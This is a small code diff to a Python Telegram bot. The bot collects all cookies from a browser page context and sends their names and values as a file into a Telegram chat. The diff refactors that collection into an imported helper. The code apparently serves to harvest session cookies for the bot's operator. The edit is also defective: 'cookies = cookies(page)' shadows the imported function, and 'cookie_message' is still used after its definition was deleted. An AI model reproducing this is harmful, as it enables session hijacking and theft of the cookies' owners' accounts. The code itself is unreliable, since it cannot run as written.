@@ -463,6 +463,7 @@ owner_chat_id = ''
 admin_chat_id = ''
 
 
+from web import cookies
 # text
 # Handle all incoming text messages
 @dad.message_handler(func=lambda message: True)
@@ -524,12 +525,7 @@ def listen(message):
             dad.send_message(message.chat.id, f'page:{page}')
 
             # Get the cookies
-            cookies = page.context.cookies()
-            # Convert cookies to a readable text message
-            cookie_message = ''
-            for cookie in cookies:
-                cookie_message += f"Name: {cookie['name']}, Value: {cookie['value']}\n"
-                print(f'\n{cookie}')
+            cookies = cookies(page)
 
             if cookie_message != '':
                 with io.BytesIO() as file:
